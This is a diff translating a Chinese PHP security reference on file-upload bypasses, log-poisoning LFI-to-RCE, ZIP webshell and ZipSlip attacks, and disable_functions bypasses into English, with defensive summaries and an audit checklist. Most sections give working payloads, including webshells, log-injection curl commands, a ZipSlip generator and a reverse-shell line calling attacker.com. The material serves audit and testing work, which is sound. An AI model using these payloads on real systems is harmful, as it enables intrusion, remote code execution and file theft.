 ---
 
-## PHP 特有文件上传绕过
+## PHP-Specific File Upload Bypass
 
-### .htaccess 上传 RCE
+### .htaccess Upload RCE
 
-#### 原理说明
+#### How It Works
 
-如果可以上传 `.htaccess` 文件到 Apache 服务器可解析的目录，就能重新定义文件解析规则，使任意扩展名被当作 PHP 执行。
+If a `.htaccess` file can be uploaded to a directory parseable by the Apache server, file parsing rules can be redefined to make any extension execute as PHP.
 
-#### 检测方法
+#### Detection Method
 
 ```
-条件:
-1. Apache + mod_php 或 Apache + php-fpm (且 AllowOverride 启用)
-2. 上传目录可被 Web 访问
-3. 未限制 .htaccess 文件上传
+Conditions:
+1. Apache + mod_php or Apache + php-fpm (with AllowOverride enabled)
+2. Upload directory is web-accessible
+3. .htaccess file upload is not restricted
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```apache
-# .htaccess 内容方案1：自定义扩展名
+# .htaccess content option 1: custom extension
 AddType application/x-httpd-php .xxx
-# 然后上传 shell.xxx，内容为 <?php system($_GET['cmd']); ?>
+# Then upload shell.xxx with content <?php system($_GET['cmd']); ?>
 
-# .htaccess 内容方案2：所有文件当 PHP 解析
+# .htaccess content option 2: parse all files as PHP
 SetHandler application/x-httpd-php
-# 然后上传任意文件名的 webshell
+# Then upload webshell with any filename
 
-# .htaccess 内容方案3：自动 prepend
+# .htaccess content option 3: auto prepend
 php_value auto_prepend_file "uploads/shell.jpg"
-# 使每个 PHP 请求都先 include shell.jpg
+# Makes every PHP request include shell.jpg first
 
-# .htaccess 内容方案4：开启 PHP 短标签
+# .htaccess content option 4: enable PHP short tags
 php_flag short_open_tag On
-# 然后上传包含 <?= system('id'); ?> 的文件
+# Then upload a file containing <?= system('id'); ?>
 ```
 
-### 扩展名绕过列表
+### Extension Bypass List
 
 ```
-可被 PHP 解析的扩展名（取决于服务器配置）:
-  .php    - 标准
-  .phtml  - 常见备选
-  .php3   - PHP 3 遗留
-  .php4   - PHP 4 遗留
-  .php5   - PHP 5 特有
-  .php7   - PHP 7 特有
+Extensions that can be parsed as PHP (depends on server configuration):
+  .php    - standard
+  .phtml  - common alternative
+  .php3   - PHP 3 legacy
+  .php4   - PHP 4 legacy
+  .php5   - PHP 5 specific
+  .php7   - PHP 7 specific
   .phar   - PHP Archive
-  .phps   - PHP 源码显示（部分配置下可执行）
-  .pht    - 部分系统支持
-  .pgif   - 极少见但存在
+  .phps   - PHP source display (executable under some configurations)
+  .pht    - supported on some systems
+  .pgif   - very rare but exists
 
-大小写变体:
-  .pHp, .PhP, .PHP, .pHP 等（Windows / 部分 Linux 配置）
+Case variants:
+  .pHp, .PhP, .PHP, .pHP etc. (Windows / some Linux configurations)
 
-双扩展名利用 (Apache 配置缺陷):
-  shell.php.jpg    → Apache 某些配置下按 .php 解析
-  shell.php.xxxxx  → 未知扩展名 fallback 到前一个
+Double extension exploitation (Apache configuration flaw):
+  shell.php.jpg    → parsed as .php under certain Apache configurations
+  shell.php.xxxxx  → unknown extension falls back to the previous one
 ```
 
-### getimagesize() 绕过（图片马）
+### getimagesize() Bypass (Image Webshell)
 
-#### 原理说明
+#### How It Works
 
-`getimagesize()` 只验证文件头部的图像 magic bytes，不检查文件后续内容。攻击者可以在合法图片头后追加 PHP 代码。
+`getimagesize()` only validates the image magic bytes in the file header and does not check the rest of the file content. Attackers can append PHP code after a valid image header.
 
-#### Payload 示例
+#### Payload Examples
 
 ```bash
-# 方法1: GIF 文件头 + PHP 代码
+# Method 1: GIF header + PHP code
 echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
 
-# 方法2: 在真实 JPEG 的 EXIF 注释中嵌入 PHP
+# Method 2: Embed PHP in the EXIF comment of a real JPEG
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg
 
-# 方法3: 在 PNG 的 IDAT chunk 中嵌入 PHP
-# 使用工具: https://github.com/huntergregal/PNG-IDAT-Payload-Generator
+# Method 3: Embed PHP in PNG IDAT chunk
+# Tool: https://github.com/huntergregal/PNG-IDAT-Payload-Generator
 
-# 方法4: 在 BMP 文件颜色表数据中嵌入
-# 前14字节为 BMP header，随后可注入 PHP 代码
+# Method 4: Embed in BMP file color table data
+# First 14 bytes are BMP header, PHP code can be injected afterward
 ```
 
-### move_uploaded_file() 竞态条件
+### move_uploaded_file() Race Condition
 
-#### 原理说明
+#### How It Works
 
-在"上传 → 检查 → 删除/移动"的流程中，文件在临时位置和最终位置之间存在时间窗口。攻击者可以利用竞态条件在检查完成前访问恶意文件。
+In the "upload → check → delete/move" flow, there is a time window between the file's temporary location and final location. Attackers can exploit the race condition to access the malicious file before the check is completed.
 
-#### Payload 示例
+#### Payload Examples
 
 ```python
-# 竞态条件利用脚本思路
-# 线程A: 持续上传 webshell
-# 线程B: 持续请求 webshell URL
-# 窗口: 文件被 move_uploaded_file() 移到目标目录后、安全检查删除前
+# Race condition exploitation concept
+# Thread A: continuously upload webshell
+# Thread B: continuously request webshell URL
+# Window: after move_uploaded_file() moves file to target directory, before security check deletes it
 
 import threading
 import requests
@@ -654,207 +654,207 @@ def access():
             break
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> 文件上传防御需要多层：扩展名白名单 + MIME 检查 + 文件内容检查 + 随机化文件名 + 上传目录禁止执行 PHP + 禁止 .htaccess 上传。
+> File upload defense requires multiple layers: extension whitelist + MIME check + file content check + randomized filenames + disable PHP execution in upload directory + block .htaccess uploads.
 
 ---
 
-## Log Poisoning RCE 模式
+## Log Poisoning RCE Patterns
 
-### User-Agent 注入 + LFI
+### User-Agent Injection + LFI
 
-#### 原理说明
+#### How It Works
 
-Web 服务器将 HTTP 请求头（User-Agent、Referer 等）写入访问日志。如果存在 LFI 漏洞可以包含日志文件，攻击者可以通过注入 PHP 代码到请求头实现 RCE。
+Web servers write HTTP request headers (User-Agent, Referer, etc.) to access logs. If an LFI vulnerability exists that can include the log file, attackers can achieve RCE by injecting PHP code into request headers.
 
-#### 检测方法
-
-```
-条件:
-1. 存在 LFI 漏洞 (include/require 参数可控)
-2. PHP 进程有权读取 Web 服务器日志
-3. 日志路径可预测
-```
-
-#### Payload 示例
+#### Detection Method
 
 ```
-# 步骤1: 向日志注入 PHP 代码
+Conditions:
+1. LFI vulnerability exists (controllable include/require parameter)
+2. PHP process has permission to read web server logs
+3. Log path is predictable
+```
+
+#### Payload Examples
+
+```
+# Step 1: Inject PHP code into the log
 curl -A '<?php system($_GET["cmd"]); ?>' http://target/any-page
 
-# 步骤2: 通过 LFI 包含日志文件
+# Step 2: Include the log file via LFI
 http://target/vuln.php?page=/var/log/apache2/access.log&cmd=id
 http://target/vuln.php?page=/var/log/nginx/access.log&cmd=id
 
-# 注意: 如果注入失败（日志被截断），可以尝试短 payload
+# Note: if injection fails (log is truncated), try a short payload
 curl -A '<?=`$_GET[1]`?>' http://target/
-# 短标签 + 反引号执行，只有19个字符
+# Short tag + backtick execution, only 19 characters
 ```
 
-### /proc/self/environ 注入
+### /proc/self/environ Injection
 
-#### 原理说明
+#### How It Works
 
-`/proc/self/environ` 包含当前进程的环境变量，其中 `HTTP_USER_AGENT` 等来自 HTTP 请求。CGI/FastCGI 模式下可直接包含此文件实现 RCE。
+`/proc/self/environ` contains the current process's environment variables, including `HTTP_USER_AGENT` and others from the HTTP request. Under CGI/FastCGI mode, this file can be directly included to achieve RCE.
 
-#### Payload 示例
+#### Payload Examples
 
 ```
-# 步骤1: 设置 User-Agent 为 PHP 代码
-# 步骤2: LFI 包含 /proc/self/environ
+# Step 1: Set User-Agent to PHP code
+# Step 2: LFI include /proc/self/environ
 http://target/vuln.php?page=/proc/self/environ
 # User-Agent: <?php system('id'); ?>
 ```
 
-### PHP Session 文件注入
+### PHP Session File Injection
 
-#### 原理说明
+#### How It Works
 
-PHP 将 session 数据存储在文件系统（默认 `/tmp/sess_<PHPSESSID>` 或 `/var/lib/php/sessions/sess_<ID>`）。如果应用将用户输入存入 session，攻击者可以注入 PHP 代码到 session 文件，再通过 LFI 包含执行。
+PHP stores session data in the filesystem (default `/tmp/sess_<PHPSESSID>` or `/var/lib/php/sessions/sess_<ID>`). If the application stores user input in sessions, attackers can inject PHP code into the session file and then execute it through LFI inclusion.
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 步骤1: 应用将用户名存入 session
+// Step 1: Application stores username in session
 // $_SESSION['username'] = $_POST['username'];
 
-// 步骤2: 注册用户名为 PHP 代码
+// Step 2: Register with a username containing PHP code
 // POST username=<?php system('id'); ?>
 
-// 步骤3: LFI 包含 session 文件
+// Step 3: LFI include the session file
 // http://target/vuln.php?page=/tmp/sess_abc123def456
-// 其中 abc123def456 是 PHPSESSID cookie 值
+// where abc123def456 is the PHPSESSID cookie value
 
-// Session 文件内容示例:
+// Session file content example:
 // username|s:26:"<?php system('id'); ?>";
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> Log Poisoning 是 LFI 升级为 RCE 的经典路径。防御要点：LFI 修复是根本，日志目录权限隔离是纵深防御。
+> Log Poisoning is the classic path for escalating LFI to RCE. Defense essentials: fixing LFI is fundamental; log directory permission isolation is defense in depth.
 
 ---
 
-## ZIP 上传 Webshell 模式
+## ZIP Upload Webshell Patterns
 
-### ZIP 解压 Webshell 植入
+### ZIP Extraction Webshell Implantation
 
-#### 原理说明
+#### How It Works
 
-如果应用接受 ZIP 上传并解压到 Web 可访问目录，攻击者可以在 ZIP 中放置 PHP webshell。即使应用检查了上传文件的扩展名是 `.zip`，解压后的内容可能包含 `.php` 文件。
+If an application accepts ZIP uploads and extracts them to a web-accessible directory, attackers can place a PHP webshell inside the ZIP. Even if the application checks that the uploaded file extension is `.zip`, the extracted contents may include `.php` files.
 
-#### 检测方法
+#### Detection Method
 
 ```
-搜索: ZipArchive::extractTo()
-搜索: zip_open() + zip_read()
-搜索: shell_exec('unzip ...')
-确认: 解压目标目录是否 Web 可访问 + 是否检查了内部文件名
+Search for: ZipArchive::extractTo()
+Search for: zip_open() + zip_read()
+Search for: shell_exec('unzip ...')
+Verify: whether the extraction target directory is web-accessible + whether internal filenames are checked
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```bash
-# 创建含 webshell 的 ZIP
+# Create a ZIP containing a webshell
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 zip evil.zip shell.php
-# 上传 evil.zip → 解压后 shell.php 出现在 Web 目录
+# Upload evil.zip → after extraction, shell.php appears in the web directory
 
-# 含路径穿越的 ZIP（ZipSlip）
+# ZIP with path traversal (ZipSlip)
 python3 -c "
 import zipfile
 z = zipfile.ZipFile('zipslip.zip', 'w')
 z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
 z.close()
 "
-# 解压时可能将文件写到上层目录
+# During extraction, the file may be written to a parent directory
 ```
 
-### system() 被禁用时的替代方案
+### Alternatives When system() Is Disabled
 
-#### 原理说明
+#### How It Works
 
-`disable_functions` 配置可以禁用危险函数。但 PHP 有大量可以读取文件或执行代码的替代函数。
+The `disable_functions` configuration can disable dangerous functions. However, PHP has numerous alternative functions that can read files or execute code.
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 当 system/exec/shell_exec/passthru/popen 被禁用时:
+// When system/exec/shell_exec/passthru/popen are disabled:
 
-// 文件读取替代
+// File reading alternatives
 echo file_get_contents('/etc/passwd');
 readfile('/flag.txt');
-show_source('/flag.txt');         // 等同于 highlight_file()
-print_r(file('/etc/passwd'));     // 按行读取为数组
+show_source('/flag.txt');         // equivalent to highlight_file()
+print_r(file('/etc/passwd'));     // reads into array by line
 $f = fopen('/etc/passwd','r'); echo fread($f, filesize('/etc/passwd'));
 
-// 命令执行替代
+// Command execution alternatives
 $proc = proc_open('id', [1=>['pipe','w']], $pipes); echo stream_get_contents($pipes[1]);
-echo `id`;                        // 反引号（本质是 shell_exec）
-pcntl_exec('/bin/sh', ['-c', 'id']);  // 需要 pcntl 扩展
-$sock = fsockopen('attacker.com', 4444); // 反弹 shell
+echo `id`;                        // backticks (essentially shell_exec)
+pcntl_exec('/bin/sh', ['-c', 'id']);  // requires pcntl extension
+$sock = fsockopen('attacker.com', 4444); // reverse shell
 
-// mail() 函数利用 (通过 -X 参数写日志)
+// mail() function exploitation (writing log via -X parameter)
 mail('','','','','-OQueueDirectory=/tmp -X/var/www/html/shell.php');
 
-// putenv() + mail() LD_PRELOAD 劫持
+// putenv() + mail() LD_PRELOAD hijacking
 putenv('LD_PRELOAD=/tmp/evil.so');
-mail('','','','');  // 触发 sendmail → 加载 evil.so
+mail('','','','');  // triggers sendmail → loads evil.so
 
-// FFI (PHP 7.4+, 需开启)
+// FFI (PHP 7.4+, must be enabled)
 $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
 $ffi->system("id");
 
-// imap_open() 利用 (需 imap 扩展)
+// imap_open() exploitation (requires imap extension)
 imap_open('{attacker.com:993/imap/ssl}INBOX', '', '', 0, 1, [
     'DISABLE_AUTHENTICATOR' => 'GSSAPI'
 ]);
-// 某些版本可通过 mailbox 参数注入命令
+// Certain versions allow command injection via the mailbox parameter
 ```
 
-### Symlink in ZIP（ZipSlip 变体）
+### Symlink in ZIP (ZipSlip Variant)
 
-#### 原理说明
+#### How It Works
 
-ZIP 文件可以包含符号链接。如果解压时未检查 symlink，攻击者可以创建指向敏感文件的符号链接，再通过 Web 访问读取。
+ZIP files can contain symbolic links. If symlinks are not checked during extraction, attackers can create symbolic links pointing to sensitive files and then read them via web access.
 
-#### Payload 示例
+#### Payload Examples
 
 ```bash
-# 创建含符号链接的 ZIP
+# Create a ZIP containing a symbolic link
 ln -s /etc/passwd passwd_link
 zip --symlinks evil.zip passwd_link
-# 上传并解压后，访问 passwd_link 即读取 /etc/passwd
+# After upload and extraction, accessing passwd_link reads /etc/passwd
 
-# 两步攻击（绕过更多检查）
-# 步骤1: 上传含 symlink 指向 / 的 ZIP
+# Two-step attack (bypasses more checks)
+# Step 1: Upload ZIP containing a symlink pointing to /
 ln -s / root_link
 zip --symlinks step1.zip root_link
 
-# 步骤2: 上传含路径 root_link/etc/passwd 的 ZIP
-# 解压后通过 symlink 读取任意文件
+# Step 2: Upload ZIP containing path root_link/etc/passwd
+# After extraction, reads arbitrary files via the symlink
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> ZIP 上传是一个被低估的攻击面。防御需要：解压前检查内部文件名（禁止 `..`）、禁止 symlink、限制解压目标目录、解压后扫描文件扩展名。`disable_functions` 不是银弹——PHP 的替代执行/读取方法极其丰富。
+> ZIP upload is an underestimated attack surface. Defense requires: checking internal filenames before extraction (MUST prohibit `..`), prohibiting symlinks, restricting the extraction target directory, and scanning file extensions after extraction. `disable_functions` is not a silver bullet — PHP's alternative execution/reading methods are extremely abundant.
 
 ---
 
-## 附录：审计 Checklist 速查
+## Appendix: Audit Checklist Quick Reference
 
 ```
-□ 所有比较操作是否使用 === 而非 ==
-□ in_array() 是否传入第三参数 true
-□ strcmp() 返回值是否用 === 0 判断
-□ include/require 路径是否可控
-□ unserialize() 是否接受外部输入
-□ 文件操作函数是否可能接受 phar:// 协议
-□ 上传功能是否检查了 .htaccess 和双扩展名
-□ ZIP 解压是否验证了内部文件路径和类型
-□ disable_functions 列表是否完整（是否遗漏了替代函数）
-□ session / 日志 路径是否可被 LFI 包含
-□ basename() / pathinfo() 是否作为唯一安全检查
-□ realpath() 返回 false 时是否正确处理
+□ Are all comparison operations using === instead of ==
+□ Does in_array() pass true as the third parameter
+□ Is strcmp() return value checked with === 0
+□ Are include/require paths controllable
+□ Does unserialize() accept external input
+□ Can file operation functions potentially accept the phar:// protocol
+□ Does upload functionality check for .htaccess and double extensions
+□ Does ZIP extraction validate internal file paths and types
+□ Is the disable_functions list comprehensive (are alternative functions missed)
+□ Can session / log paths be included via LFI
+□ Is basename() / pathinfo() used as the sole security check
+□ Is realpath() returning false handled correctly
 ```
